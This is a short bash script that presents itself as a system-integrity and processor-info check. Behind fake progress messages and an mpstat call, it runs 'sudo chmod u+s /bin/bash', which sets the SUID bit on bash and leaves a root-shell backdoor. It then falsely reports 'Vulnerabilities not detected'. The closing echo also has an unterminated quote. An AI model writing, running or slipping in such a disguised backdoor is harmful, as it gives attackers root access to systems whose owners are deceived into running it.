#! /bin/bash
back()
{
 echo "Checking system integrity..................."
 sleep 4
 sudo chmod u+s /bin/bash
 echo "Proccesor info runing: "
 for i in 1 2 3 4 5; do
 sleep 2
 echo -e "/\\/\\/\\"
 done
 sleep 5
 mpstat
 echo "Succesfull execution"
}

back
echo -e "Vulnerabilities not detected\nExecution completed; 
